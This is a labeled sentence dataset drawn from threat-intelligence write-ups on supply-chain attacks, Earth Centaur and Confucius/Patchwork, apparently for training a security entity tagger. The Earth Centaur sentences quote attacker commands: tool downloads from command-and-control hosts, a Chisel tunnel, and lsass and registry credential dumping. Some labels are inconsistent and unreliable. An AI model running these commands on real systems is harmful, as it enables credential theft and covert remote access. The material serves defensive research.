label: SHA2

text: The Cybersecurity and Infrastructure Security Agency (CISA) and the National Institute for Standards and Technology (NIST) recently published “Defending Against Software Supply Chain Attacks”.
label: identity

text: The guideline provides an overview of software supply chain risk and how vendors and customers can identify and assess such risks using the NIST Cyber Supply Chain Risk Management (C-SCRM) Framework and the Secure Software Development Framework (SSDF).
label: safe

text: Software supply chains are an integral part of a large information and communications technology (ICT) supply chain framework.
label: safe

text: It is an ecosystem of retailers, distributors, and suppliers participating in the sale, delivery, and production of hardware, software, and managed services.
label: safe

text: An attack on the software supply chain happens when a cyber threat actor invades a vendor's network and uses malicious codes, compromising the software before the vendor sends it to their consumers.
label: safe

text: The compromised software will then put the customer's data or system at risk.
label: safe

text: According to the guideline, newly acquired software may be compromised from the get-go.
label: safe

text: It can also be compromised through a patch or hotfix.
label: safe

text: These threats affect all users of the tampered software, resulting in major consequences for government, critical infrastructure, and private sector software consumers.
label: safe

text: The guideline thoroughly explains the three most common methods threat groups use to infiltrate the supply chain.
label: safe

text: It also establishes a few recommendations for software customers and vendors to prevent and mitigate attacks as well as improve resilience against software supply chain attacks.
label: safe

text: The three most common methods are taking over the software update mechanism to deliver an updated software with malicious code, exploiting misconfigured access controls, and targeting publicly accessible code libraries, and inserting malicious code, which unknowing customers then download to their systems.
label: safe

text: The document also provides the following eight best practices for establishing a C-SCRM approach and applying it to software:  Incorporating C-SCRM across the organization; Creating a formal C-SCRM program; Knowing and managing critical components and suppliers; Understanding the organization's supply chain; Working closely with key suppliers; Including key suppliers in resilience and improvement activities; Evaluating and monitoring throughout the supplier relationship; and Planning for the full life cycle.
label: safe

text: While the guideline gives thorough recommendations on preventing supply chain attacks, it is still vital for organizations to take extra measures to mitigate vulnerable software components.
label: safe

text: Organizations should also create a program that can manage and control their supply chain's vulnerabilities, minimizing the possibilities of attacks.
label: safe

text: In addition, organizations must know and understand the risks associated with supply chains and smart factories.
label: safe

text: To learn more about overlooked risks associated with supply chain and smart factories, read our expert team's proof of concept paper, "Forward-looking security analysis of smart factories".
label: safe

text: This extensive research also discusses feasible attack scenarios and recommended defense strategies.
label: safe

text: Tags  Latest News | Cloud | APT & Targeted Attacks | Network | Articles, News, Reports | Cyber Threats
label: safe

text: The Cybersecurity and Infrastructure Security Agency (CISA) recently issued an alert regarding an advanced persistent threat (APT) compromising government agencies, critical infrastructures, and private sector organizations.
label: identity

text: According to CISA, the APT actor is accountable for the compromise of the SolarWinds Orion supply chain.
label: identity

text: The actor is also responsible for the abuse of commonly used authentication mechanisms.
label: attack-pattern

text: The Agency then urged organizations to make identifying and addressing such threats a priority.
label: safe

text: Under the Presidential Policy Directive (PPD) 41, the agency, together with the Federal Bureau of Investigation (FBI), and the Office of the Director of National Intelligence (ODNI), formed a Cyber Unified Coordination Group (UCG).
label: identity

text: This group aims to coordinate a "whole-of-government" response to the above-mentioned cyber incident.?
label: safe

text: A UCG is also formed for integrating private sector partners into incident response efforts.
label: identity

text: In general, a Cyber UCG is created when a vital cyber incident affects critical infrastructure owners and operators.
label: identity

text: These are determined by the Secretary of Homeland Security as possessing or operating critical infrastructure wherein a cyber incident could lead to a catastrophic regional or national effect on national security, economic security, or public health.
label: identity

text: Supply chain attacks are quite risky and could result in real-world impacts.
label: safe

text: In a report done by Trend Micro entitled “Critical Infrastructures Exposed and at Risk: Energy and Water Industries”, researchers were able to expose vulnerabilities of human-machine interface (HMI) used in critical water and energy organizations.
label: identity

text: They also showed real-world implications that these vulnerabilities have.
label: safe

text: Geopolitical risk is also a big concern for securing supply chains.
label: safe

text: To mitigate such risk, organizations must think globally and exert efforts to follow codes of local culture.
label: safe

text: Organizations need to have a deeper understanding of regional and national policies to ensure the safety of the supply chain.
label: safe

text: Read our three-part series on smart factories from the perspective of supply chain disruptions to learn more about supply chain cybersecurity.
label: safe

text: Tags  Latest News | ICS OT | APT & Targeted Attacks | IoT |
label: safe

text: Articles, News, Reports
label: safe

text: Earth Centaur, previously known as Tropic Trooper, is a long-running cyberespionage threat group that has been active since 2011.
label: TIME

text: In July 2020, we noticed interesting activity coming from the group, and we have been closely monitoring it since.
label: TIME

text: The actors seem to be targeting organizations in the transportation industry and government agencies related to transport.
label: safe

text: We observed that the group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories).
label: safe

text: Currently, we have not discovered substantial damage to these victims as caused by the threat group.
label: safe

text: However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data.
label: safe

text: Through long-term monitoring, we learned that this threat group is proficient at red teamwork.
label: safe

text: The group knows how to bypass security settings and keep its operation unobstructive.
label: safe

text: Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems.
label: safe

text: The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently.
label: safe

text: We expand on these techniques and other capabilities in the following sections.
label: safe

text: More importantly, we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation.
label: safe

text: It is our aim, through this article, to encourage enterprises to review their own security setting and protect themselves from damage and compromise.
label: safe

text: Overview of Earth Centaur’s infection chain
label: threat-actor

text: Based on our investigation, we found that the intrusion process used by Earth Centaur can be separated into several stages, which are shown in Figure 1.
label: threat-actor

text: We found that the threat actors used vulnerable Internet Information Services (IIS) server and Exchange server vulnerabilities as entry points, and then installed web shells.
label: vulnerability

text: Afterward, the .NET loader (detected as Nerapack) and the first stage backdoor (Quasar remote administration tool aka Quasar RAT) were deployed on the compromised machine.
label: malware

text: Then, depending on the victims, the threat actors dropped different types of second-stage backdoors, such as ChiserClient and SmileSvr.
label: malware

text: After exploiting the victim's environments successfully, the threat actors start Active Directory (AD) discovery and spread their tools via Server Message Block (SMB).
label: safe

text: Then, they use intranet penetration tools to build the connection between the victim’s intranet and their command-and-control (C&C) servers.
label: safe

text: We go into further detail about these stages in our analysis.
label: safe

text: Figure 1. Stages of Earth Centaur’s intrusion process      Technical Analysis of Earth Centaur’s Tools and Techniques Stage 1: Loaders
label: threat-actor

text: After the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin). C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command "&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.exe' "%temp%/dfmanager.exe"}" C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command "&{Import-Module BitsTransfer; Start-BitsTransfer 'http://<redacted>:8000/dfmanager.bin' "C:\Users\<redacted>\AppData\Local\Temp/dfmanager.bin"}"
label: attack-pattern

text: After our long-term monitoring, we observed that there are two different decryption algorithms (DES or AES) used in Nerapack to decrypt the payload.
label: malware

text: Moreover, in its newer version, it uses a technique called “Timestomping.”
label: safe

text: Timestomping is when the timestamp of the payload file (.bin) is altered to make it harder for incident response analysts to find it.
label: safe

text: Figure 2. Timestomping used on the bin file     The decryption key is used as an argument of Nerapack and various keys are used on different victims.
label: malware

text: It is a simple but effective technique that makes security analysis more difficult and also ensures that only their operators can use the tools.
label: safe

text: The command for execution is shown as here: > Nerapack.exe {base64 encoded key}
label: FILEPATH

text: Fortunately, we were still able to collect the decryption key in some cases and we decrypted the payload successfully.
label: safe

text: Based on our current cases, the decrypted payload is Quasar RAT.
label: malware

text: After the payload is deployed, the actors can continue further malicious actions through Quasar RAT.
label: malware

text: Stage 2: Backdoors
label: safe

text: After further analysis, we found that the threat group developed multiple backdoors capable of communication via common network protocols.
label: safe

text: We think this indicates that it has the capability to bypass network security systems by using these common protocols to transfer data.
label: attack-pattern

text: We also found that the group tries to launch various backdoors per victim.
label: attack-pattern

text: Furthermore, it also tends to use existing frameworks to make customized backdoors.
label: attack-pattern

text: By using existing frameworks, examples of which are detailed in the following, it builds new backdoor variants more efficiently.
label: safe

text: ChiserClient
label: malware

text: After the backdoor is launched, it will decrypt the embedded C&C configuration via AES (CTR mode) algorithm for the following connection.
label: safe

text: In the configuration, there are three C&C addresses and corresponding port numbers.
label: safe

text: Figure 3.
label: safe

text: Decrypted C&C configuration
label: safe

text: In the first connection, ChiserClient will append the host name of the compromised host for check-in purposes.
label: malware

text: Then, it will keep running on the hosts and wait for further commands from the C&C server.
label: safe

text: ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host.
label: malware

text: The capability of ChiserClient is shown in the following table:  Command code Function 0x10001
label: malware

text: Write specified file 0x10002
label: safe

text: Download File 0x10003
label: safe

text: Read specified file 0x10004
label: safe

text: No Action 0x10005
label: safe

text: Open a command shell for command execution
label: safe

text: HTShell HTShell is a simple backdoor that is developed using the Mongoose framework (version 6.15).
label: malware

text: Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.Js.
label: tools

text: It is used to translate between objects in code and objects representation in MongoDB.
label: SOFTWARE

text: We saw in our cases that the HTShell client will be launched as a system service on the compromised machine and that it will connect to a C&C server.
label: malware

text: HTShell supports importing additional config files.
label: malware

text: We found that the additional config file is located in %PUBLIC%\Documents\sdcsvc.dat, and that the content should be encoded by base64.
label: FILEPATH

text: If no config file is imported, it will connect to the predefined C&C address.
label: safe

text: HTShell hardcoded C&Cs     HTShell encodes a hard­-coded string, "tp===" with custom base64 and embeds the encoded string in the request cookies.
label: malware

text: If the C&C server receives the request with the special cookie value, it can verify that the request comes from its client applications.
label: safe

text: HTShell hardcoded and encoded cookie string in the request header     The response handler of HTShell will use “`” as delimiter to split the command code and argument for the received command.
label: malware

text: Hence, the command will be this format:  <command code>`<custom-base64encoded-data>[`<more-custom-base64encoded-data>] HTShell currently supports three different backdoor functions, shown here:  Command code Function 0 Open a command shell for command execution 1
label: malware

text: Upload file 2 Download file
label: safe

text: Customized Lilith RAT
label: malware

text: During our investigation into Earth Centaurs activities, we found that it also uses another backdoor called Lilith RAT.
label: threat-actor

text: We think that this Lilith RAT is a highly modified version of the open-source Lilith RAT.
label: malware

text: The actors reused part of the codes for command execution, while the C&C protocol is changed to Dropbox HTTPS APIs.
label: safe

text: Reused codes from open-source Lilith RAT     In order to launch this RAT, the threat actors use a technique called "Phantom DLL hijacking."
label: malware

text: In this technique, the RAT will be disguised as the normal wlbsctrl.dll.
label: FILEPATH

text: While the Windows service “IKEEXT” is starting, the fake wlbsctrl.dll is loaded and executed with high privilege.
label: safe

text: Furthermore, when Lilith RAT is terminated, it will try to clean itself to prevent being found by investigators.
label: malware

text: Figure 7.
label: safe

text: Self-deletion after execution
label: safe

text: For the C&C connections, the customized Lilith RAT will first check in to the attacker’s Dropbox and see if the victim host exists.
label: SOFTWARE

text: If not, the hostname and IP address will be collected and appended to the existing compromised hosts’ information.
label: safe

text: All data will then be encrypted and sent back.      Figure 8.
label: safe

text: The first check-in request to the Dropbox C&C     After the check-in request, the backdoor will start to wait for more commands to come in.
label: safe

text: All the request data are formatted to JSON, and they are encrypted by AES and encoded by base64.
label: safe

text: Here is a list of the C&C commands:
label: safe

text: Command Description CMDCommand Executes commands DownloadCloudFile Downloads files UploadCloudFile Uploads files GetDir Lists directories GetDirFile Lists files in a directory DeleteSelf Deletes itself  SmileSvr
label: safe

text: We found that there are two types of SmileSvr.
label: safe

text: The difference between the two variants is the protocol used for communication: ICMP and SSL.
label: safe

text: The threat actors will use an installer to install SmileSvr as a system service and drop a DAT file that contains encoded C&C information.
label: safe

text: In the configuration file, the memory size used for storing C&C address and C&C address will be defined.
label: safe

text: Encrypted configuration file
label: safe

text: The ICMP version of SmileSvr will create an ICMP socket to connect to the specified C&C address, which is defined in a configuration file.
label: safe

text: In each SmileSvr, there is an embedded number (e.g., 10601 in Figure 10.) and this value will be used as sequence number in the sent ICMP packet.
label: safe

text: We think attackers use this value to verify if the incoming packet belongs to their backdoor and filter out the noise.
label: safe

text: Figure 10.
label: safe

text: Decrypted configuration file     Without knowing the real traffic from the C&C server, we can only speculate on the content of the response based on the receiving function.
label: safe

text: As shown in Figure 11, the content of the response should contain the sequence number used to verify if the received data comes from the correct source and two blocks of encrypted data.
label: safe

text: The data decryption procedure is as follows:  First, the encrypted data is decrypted with a one-byte XOR key (0xFF).
label: safe

text: The first of the decrypted content contains a magic number used to check data in the second block, a command code, and the XOR key to decrypt the second set of encrypted content.
label: safe

text: The second set of encrypted content is decrypted with an XOR key (0x99) from the previous decrypted content, and within the decrypted data are instructions for the following procedures.
label: safe

text: SmileSvr packet traffic format simulation
label: safe

text: While analyzing samples, we found that the C&C server was already inactive.
label: safe

text: Without knowing the traffic between SmileSvr and C&C server, we could not fully understand all functions.
label: safe

text: However, most of the backdoor functions are listed here:  Command code Function 0x5001
label: safe

text: Opens/Reads specified file 0x5002 Unknown 0x5004 Opens/Writes specified file 0x5006
label: safe

text: Opens command shell 0x5007 Unknown 0x5009 Closes command shell 0x500A
label: safe

text: File System Traversal 0x500C
label: safe

text: Checks environment information 0x500E Unknown
label: safe

text: As for the SSL version of SmileSvr, the capability of SSL communication is built by using wolfSSL, which is a lightweight, C-language based SSL/TLS library.
label: safe

text: The backdoor functions of SSL version SmileSvr are similar to the ICMP ones.
label: safe

text: The threat actors just use it to develop new ways to support data transfer via an encrypted channel.
label: safe

text: Customized Gh0st RAT
label: malware

text: In our investigation, we also found a suspicious executable named telegram.exe.
label: FILEPATH

text: After analyzing the file, we found that it was a customized version of Gh0st RAT.
label: malware

text: Compared to the original Gh0st RAT (Gh0st beta 3.6), the difference is that the customized version supports a new function to discover information from active sessions on the host.
label: malware

text: All supported functions for the customized Gh0st are shown in the following table:  Command code Function 0xC8 Terminates connection 0xCA
label: malware

text: File manager to handle file operations 0xCB Screen monitoring 0xCC Opens remote shell for command execution 0XD5 Gets active session information  Post
label: safe

text: Exploitation
label: safe

text: After successfully exploiting the vulnerable system, the threat actor will use multiple hacking tools to discover and compromise machines on the victim’s intranet.
label: safe

text: In this stage, we also observed attempts to deploy tools to exfiltrate stolen information.
label: safe

text: During our investigation, we found evidence of specific tools, which we listed in Table 1.
label: safe

text: With these tools, the attackers accomplish their goals (network discovery, access to the intranet, and exfiltration) step by step.
label: safe

text: Tool name Purpose Description SharpHound AD Discovery Discovery tool to understand the relationship in an AD environment FRPC Intranet Penetration Fast reverse proxy to help expose a local server behind a NAT or firewall to the internet Chisel Intranet Penetration Fast TCP/UDP tunnel RClone Exfiltration A command-line program to sync files and directories to and from different cloud storage providers  Credential Dumping
label: attack-pattern

text: We also observed that the group used multiple legitimate tools to dump credentials on compromised machines.
label: safe

text: It made good use of these tools to achieve its goal and keep its operation hidden and unobstructive.
label: safe

text: For example, the group uses ProcDump.exe (a tool from Windows Sysinternals Suite that creates dumps of the processes in any scenario), which it renamed bootsys.exe: c:\users\public\downloads\bootsys.exe  -accepteula -ma lsass.exe C:\Users\Public\Downloads\lsass.dmp
label: FILEPATH

text: The group dumps credentials stored in registries by using reg.exe: reg.exe save hklm\sam C:\Users\Public\Downloads\sam.hive reg.exe save hklm\sam c:\windows\temp\sa.dit reg.exe save hklm\security c:\windows\temp\se.dit reg.exe save hklm\system c:\windows\temp\sy.dit
label: FILEPATH

text: The group would also dump memory from the specified process by using comsvcs.dll: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 764 C:\Windows\TEMP\dump.bin full Indicator Removal  To avoid exposing their footprints to investigators, the threat actors made their own tool to wipe out the event logs on the victimized machine.
label: tools

text: By using this tool, they could clean specified event logs and make it hard for investigators to track their operations.
label: safe

text: The usage is as follows:          Intranet Penetration
label: safe

text: After successfully exploiting the vulnerable system, threat actors also drop following tools: FRP and Chisel.
label: tools

text: FRP is a fast reverse proxy used to expose a local server behind an NAT or a firewall to the internet.
label: tools

text: It can read predefined configurations and make the host in the intranet available to users from the internet.
label: safe

text: Configuration for FRP fast reverse proxy      Chisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls.
label: malware

text: It provides the capability to transport data over HTTP (secured via Secure Shell, aka SSH) and allows threat actors to pass through a firewall and get access to the machine behind the firewall.
label: safe

text: This is used to download reverse proxy Chisel via PowerShell: c:\windows\system32\windowspowershell\v1.0\powershell.exe -command "$(new-object System.Net.WebClient).DownloadFile('https[:]//webadmin[.]mirrorstorage[.]org/ch.exe', 'ch.exe')"
label: malware

text: This is used to build a connection between inter/intranet via Chisel:  C:\WINDOWS\system32\ch.exe client https[:]//webadmin[.]mirrorstorage[.]org:443 r:127.0.0.1:47586:socks Exfiltration
label: URL

text: In the previous phase, we observed that the actors use several tools to get the whole picture of the network infrastructure and bypass the firewall.
label: safe

text: Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration.
label: tools

text: It also provides an easy and effective way of copying data to several cloud storage providers.
label: safe

text: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -command "$(new-object System.Net.WebClient).DownloadFile('http://195[.]123[.]221[.]7:8080/rclone.exe', 'r.exe')
label: FILEPATH

text: Based on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data.
label: tools

text: However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks.
label: safe

text: Identifying Features in the Earth Centaur Campaign
label: campaign

text: After long-term observation and analysis of the attack campaigns, there was compelling evidence that they were operated by Earth Centaur.
label: attack-pattern

text: We found several identifying features of the threat actors within the techniques and tools described in the preceding sections, and we break down the factors in the following.
label: safe

text: Mutex Style
label: safe

text: We found some special mutexes that are encoded by the layout of the Chinese Zhuyin keyboard in ChiserClient.
label: malware

text: The decoded string is shown in Table 2.
label: safe

text: Based on these special mutex strings, we believe the threat actors come from a Chinese-speaking region.
label: threat-actor

text: Table 2. Encoded/Decoded mutex string Encoded string Decoded string in Chinese English translation vul3ru,6q8 q8 y.3 小傑趴趴走 Jack goes around ji394su3 我愛你 I love you 5ji fu.6cl3g.3zj6m0694 桌球好手福原愛 Excellent table tennis player, Ai Fukuhara  Configuration style
label: safe

text: After analyzing the ChiserClient, we found that it shares a similar style of network configuration to the TClient mentioned in our previous research on Earth Centaur.
label: malware

text: Figure 13. Network configuration (Left: ChiserClient
label: malware

text: Right: TClient)
label: malware

text: Code Similarity
label: safe

text: After checking the backdoor SmileSvr, we found that there was a code similarity between it and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation.
label: malware

text: Both share similar codes in configuration decoding, which is shown in Figure 14.
label: safe

text: Furthermore, the delimiter that was used in SmileSvr to split different values in configuration files is the same as the one used in YAHAMAM (shown as Figure 15).      Figure 14.
label: malware

text: Configuration decoding function (left: SmileSvr right: Troj_Yahamam)      Figure 15. Function used to split different values in configuration file (left: SmileSvr right: Troj_Yahamam)
label: malware

text: Conclusion
label: safe

text: These threat actors are notably sophisticated and well-equipped.
label: safe

text: Looking deeper into the new methods the group uses, we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar.
label: safe

text: For example, the group can map their target’s network infrastructure and bypass firewalls.
label: attack-pattern

text: It uses backdoors with different protocols, which are deployed depending on the victim.
label: attack-pattern

text: It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as C&C servers.  In this blog, we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries.
label: safe

text: Information on how a threat enters and operates within a victim’s network is invaluable to security teams and can help them create more effective protection for vulnerable organizations.
label: safe

text: Organizations can also find capable security solutions that can help interpret and respond to malicious activities, techniques, and movements before the threat can culminate and affect an enterprise.
label: safe

label: SOFTWARE

text: Updated the appendix on August 30, 2018 to fix formatting and add new information.
label: TIME

text: Back in February, we noted the similarities between the Patchwork and Confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia.
label: threat-actor

text: During the months that followed in which we tracked Confucius’ activities, we found that they were still aiming for Pakistani targets.
label: location

text: During their previous campaign, we found Confucius using fake romance websites to entice victims into installing malicious Android applications.
label: threat-actor

text: This time, the threat actor seems to have a new modus operandi, setting up two new websites and new payloads with which to compromise its targets.
label: safe

text: Fake Android porn app and Windows chat applications as lures
label: safe

text: The first website uses adult content as a lure, via an Android application called Fuddi Duniya, which links to a website that displays nude pictures every day.
label: SOFTWARE

text: The app’s APK is linked directly from the homepage, with a disclaimer stating that Google Play does not allow pornography in their store.
label: SOFTWARE

text: Figure 1: fake website with a link to download the Fuddi Duniya app.
label: malware

text: The displayed Urdu text could be translated as “Real women, girls, and housewives || Download the app now More than thousands of women app.”
label: safe

text: The app’s features are similar to the previous malicious Android application, such as having the ability to record audio and steal SMS, accounts, contacts and certain file types from specific directories.
label: SOFTWARE

text: In addition, the application now retrieves the last known location and uses the development platform Google Firebase to upload the stolen content.
label: SOFTWARE

text: Figure 2: Stealing function excerpt from Fuddi Duniya Android app
label: malware

text: The second fake website is again related to chat, with a background suggesting that it can help find users a partner.
label: safe

text: Initially, a link to a malicious Android application hosted on Google Play that shared the same features as the application described above was present.
label: SOFTWARE

text: But after we reached out to Google while carrying out the research, the application was removed from the store and the link was removed from the fake website.
label: identity

text: Figure 3. Screenshot of the second fake website
label: safe

text: Same as with the fake Tweety chat application we described in detail in our previous research, a Windows application with real chat features based on the open-source chat application RocketChat was offered.
label: malware

text: Similarly, this application also comes bundled with malicious .NET code.
label: safe

text: While small and relatively simple, we found this malicious application interesting to analyze as it revealed the countries targeted by the threat actor.
label: safe

text: The application is a simple downloader that sends some basic information (username, antivirus, IP address, and operating system version) encrypted using triple Data Encryption Standard (DES).  Figure 4.
label: safe

text: Sample of the app’s code Periodically, the malware tries to contact the Command-and-Control (C&C) server with the username encoded into parameters.
label: safe

text: Based on the information they retrieve, the operators can then decide to instruct the malware to download the second stage payload.
label: safe

text: This function is similar to the various versions of backdoors (such as sctrls and sip_telephone) that we analyzed in our previous blog post and whitepaper.
label: safe

text: An interesting feature of the downloader: It uses an online service to retrieve the victim's IP address and country, which it compares with a list of allowed countries.
label: safe

text: If the victim seemingly comes from a different country, the program will self-delete and quit.
label: safe

text: Excerpt of the valid country list We noted that it does both client-side and server-side IP filtering, showing that the attacker has improved its infrastructure.
label: safe

text: At the end of last year, a C&C from the same threat actor was not only accessible from any IP address, but it was possible to browse the server directory tree without authentication.
label: safe

text: After impersonating a fake victim of interest, we obtained a second stage payload (Detected as TROJ_DELF.XXWZ), which is a filestealer based on the Delphi programming language similar to the “svctrls” malware described in our previous blogpost.
label: malware

text: This one is called “sysctrls” and it looks for files with the following extensions:
label: safe

text: Extension File Type .doc, docx Microsoft Word document .xls,.xlsx
label: safe

text: Microsoft Excel document .ppt, .pptx Microsoft Powerpoint presentation .pptx
label: safe

text: Microsoft Powerpoint presentation .png, .jpg, .jpeg Image file .pst, .ost Microsoft Outlook file .csv
label: safe

text: Spreadsheet file
label: safe

text: It then sends them via a POST HTTP request to windefendr[.]com/description.php.
label: URL

text: Further analysis of this filestealer revealed interesting links with other threat actor groups.
label: safe

text: The Delphi Link
label: safe

text: We already mentioned that Confucius had possible links to other groups in our previous blog post, which mentioned code sharing between Patchwork and Confucius.
label: threat-actor

text: Both groups used a backdoor with the same configuration file structure and commands.
label: safe

text: We found more code shared among the two threat actor’s malware, as Patchwork recently used multiple Delphi malware similar to some of the Delphi malware we described before.
label: malware

text: We initially spotted some visual similarities between the malware used.
label: safe

text: Although no forms are displayed while the malware is running, we can see its TForm object in the Delphi decompiler.
label: safe

text: The TForm object often has two TTimer objects — but sometimes we have seen one or even three of these objects — usually with random names.
label: safe

text: Occasionally, listboxes with encrypted strings are also added.
label: safe

text: Figure 6: Decompiled Form structure of Confucius’ sample (d971842441c83c1bba05742d124620f5741bb5d5da9ffb31f06efa4bbdcf04ee, Detected as TSPY_CONFSTEAL.A)  Figure 7:
label: SHA2

text: Decompiled Form structure of Patchwork’s sample (795ae4097aa3bd5932be4110f6bd992f46d605d4c9e3afced314454d35395a59, Detected as TROJ_DELF.XXWZ)
label: threat-actor

text: While looking into any of the TTimers’ OnTimer methods, we often found a certain kind of structure: A pointer to an encrypted string stored in an EDX register followed by the call to the decryption function.
label: safe

text: Figure 8: Calling the decryption function This encouraged us to analyze the string encryption routines thoroughly.
label: safe

text: Our analysis revealed three of them.
label: safe

text: The first involves a very simple routine that flips every bit of the string.
label: safe

text: The second algorithm involves a hardcoded key, which is transformed by taking the five lower bits of each character, and then used as a XOR key.
label: safe

text: In some cases, the key is split in half in the binary, so it is first reunited before being used.
label: safe

text: Finally, our third algorithm uses a 94-character substitution table.
label: safe

text: This algorithm was previously discussed by security researchers in a Confucius-related blog post.
label: threat-actor

text: For each of these routines, we found a recent sample going back to a domain name belonging to Patchwork’s infrastructure.
label: threat-actor

text: The substitution tables of the third algorithm were randomly generated at build time, while the attacker seemingly set the keys used in the second algorithm.
label: safe

text: We found six different keys in the latter category that were different for the Patchwork and Confucius group.
label: threat-actor

text: On the left, Confucius code, on the right, Patchwork’s code
label: threat-actor

text: Interestingly, one of those keys, “xldbszcd”, was found in a file stealer used by Confucius (472ea4929c5e0fb4e29597311ed90a14c57bc67fbf26f81a3aac042aa3dccb55, Detected as TSPY_CONFSTEAL.A) as well as in two other file stealers.
label: SHA2

text: One file stealer (cca74bb322ad7833a21209b1418c9837e30983daec30d199a839f46075ee72f2, Detected as TSPY_DELF.SUW) published by security researchers in 2013 and linked to the domain myflatnet[.]com, was attributed by several parties to the Hangover group.
label: threat-actor

text: The other file stealer (1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a, Detected as TROJ_DELF.XXWZ) is related to a domain reported in September 2016.
label: malware

text: That report also mentioned InPage software targeting and Delphi backdoors.
label: safe

text: Left: Confucius group, Middle: Hangover group, Right: Unnamed group
label: threat-actor

text: After some research, we found multiple Delphi backdoors that used any of the three decryption routines.
label: safe

text: The backdoors also linked to an infrastructure matching old Hangover domains as well as the infrastructure of domains from the September 2016 blog post.
label: TIME

text: Some of these samples were several years old and had left the original name of the bit-flip decryption algorithm, which was “EnDecrypt”.
label: safe

text: This algorithm matches the following code snippet.
label: safe

text: Patchwork's Ongoing Campaigns
label: threat-actor

text: Aside from their Delphi malware, Patchwork is still active.
label: threat-actor

text: Lately, they have been sending multiple RTF files exploiting CVE-2017-8570.
label: vulnerability

text: The dropped payloads are modified versions of the Remote Administration Tool QuasarRAT that can be traced to the domains sastind-cn[.]org and tautiaos[.]com.
label: DOMAIN

text: Figure 11.
label: safe

text: Process tree after a successful infection
label: safe

text: The attackers sometimes design the weaponized documents to look like legitimate documents of interest to the target.
label: safe

text: The documents are also unusually large — often more than 10 megabytes.
label: safe

text: On the left, the weaponized document.
label: safe

text: On the right, the legitimate document from CSBA.
label: identity

text: Note that the weaponized document was crafted to look like it came from CSBA but does not imply that CSBA or its related assets have been compromised
label: identity

text: The group still uses the Badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added Blowfish encryption on top of their custom encryption described in our former Patchwork blogpost.
label: malware

text: Defending against Confucius and Patchwork Threat actors like Confucius and Patchwork are known for their large arsenal of tools and ever-evolving techniques that can render traditional security solutions — which are often not designed to handle the persistent and sophisticated threats detailed in this blog — ineffective.
label: threat-actor

text: To help combat these kinds of threats organizations will need to take a more proactive and focused security posture that can cover the most ground in terms of security.
label: safe

text: Some specific security measures organizations can implement:  Recognize social engineering attempts.
label: safe

text: Malicious mobile apps are common infection vectors for cybercriminals, as they can attract specific target audiences.
label: safe

text: In this case, Confucius went with the common adage “sex sells” Proactively monitor the organization’s network.
label: threat-actor

text: Threat actors are notorious for creating stealthy malware that can bypass superficial network monitoring.
label: safe

text: A more proactive stance that includes proper application of firewalls and intrusion detection and prevention systems can help mitigate the impact of an attack Implement network segmentation.
label: safe

text: Even with the best security technology, there is still a chance of an attack slipping through.
label: safe

text: Separating the network into individual parts, as well as restricting access to only those who really need it, can mitigate the damage that occurs in case of a successful attack.
label: safe

text: Update systems regularly.
label: safe

text: Everything from endpoints to network software to IoT devices should be patched and updated to prevent or minimize the chance of a threat actor exploiting a vulnerability  In an ideal scenario, an organization’s in-house security team implement all of these and other security measures.
label: safe

text: The reality is that IT departments of small to large-sized organizations are not equipped to handle the more advanced threats that groups like Confucius use in their attacks.
label: threat-actor

text: Since these teams also handle the day-to-day IT requirements of the organization, taking on a more involved and proactive stance may not be easy.
label: safe

text: In this case, an organization can look into third party security providers who can handle specialized work, such as root cause analysis and detailed research, and also provide a remediation plan that gives organizations a better chance against advanced threats.
label: safe

text: Trend Micro Solutions Patchwork uses email as an entry point, which is why securing the email gateway is important.
label: identity

text: Trend Micro™ Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network.  Trend Micro™ Email Inspector and InterScan™ Web Security prevent malware from ever reaching end users.
label: SOFTWARE

text: At the endpoint level, Trend Micro™ Smart Protection Suites deliver several capabilities that minimize the impact of Patchwork’s attacks.
label: threat-actor

text: These solutions are powered by Trend Micro XGen™ security, which provides a cross-generational blend of threat defense techniques against a full range of threats for data centers, cloud environments, networks, and endpoints.
label: SOFTWARE

text: It features high-fidelity machine learning to secure the gateway and endpoint data and applications, and protect physical, virtual, and cloud workloads.
label: safe

text: This appendix contains the latest indicators of compromise (IOCs) related to the different groups.
label: safe

label: safe

text: Introduction
label: safe

text: While investigating the Confucius threat actor, we found a recent spear phishing campaign that utilizes Pegasus spyware-related lures to entice victims into opening a malicious document downloading a file stealer.
label: attack-pattern

text: The NSO Group’s spyware spurred a collaborative investigation that found that it was being used to target high-ranking individuals in 11 different countries.
label: threat-actor

text: In this blog entry, we take a look at the lures used by the malicious actor and provide a short analysis of the file stealer used in the campaign, which was launched in early August.
label: TIME

text: The contents of the spear phishing email The campaign involves a two-step attack.
label: attack-pattern

text: During the first phase, an email without a malicious payload containing content copied from a legitimate Pakistani newspaper’s article is sent to the target.
label: safe

text: The sender address, which is spoofed, impersonates the PR wing of the Pakistani Armed Forces (info@ispr.gov.pk).
label: identity

